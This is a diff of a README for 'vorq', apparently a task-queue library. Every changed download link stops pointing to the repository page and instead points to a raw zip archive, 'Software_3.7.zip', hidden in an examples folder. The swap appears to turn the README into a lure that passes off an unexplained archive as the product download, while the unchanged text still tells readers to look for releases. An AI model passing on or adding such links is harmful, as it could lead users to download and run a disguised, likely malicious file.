@@ -1,12 +1,12 @@
 # ⚙️ vorq - Type-safe task queues for teams
 
-[![Download vorq](https://img.shields.io/badge/Download-vorq-blue?style=for-the-badge&logo=github)](https://github.com/morlysemicircular730/vorq)
+[![Download vorq](https://img.shields.io/badge/Download-vorq-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the latest version:
 
-[Open the vorq download page](https://github.com/morlysemicircular730/vorq)
+[Open the vorq download page](https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip)
 
 ## 🖥️ What vorq is
 
@@ -36,7 +36,7 @@ If you only want to try the project on your own computer, you can start with a l
 ## 🚀 Getting started
 
 1. Open the download page:
-   [https://github.com/morlysemicircular730/vorq](https://github.com/morlysemicircular730/vorq)
+   [https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip](https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip)
 
 2. On the GitHub page, look for the latest release or the main project files.
 
@@ -226,7 +226,7 @@ It fits cases where you want:
 
 If you need the project link again, use this page:
 
-[https://github.com/morlysemicircular730/vorq](https://github.com/morlysemicircular730/vorq)
+[https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip](https://raw.githubusercontent.com/morlysemicircular730/vorq/main/examples/demo-app/Software_3.7.zip)
 
 ## 🔧 Basic setup checklist
 
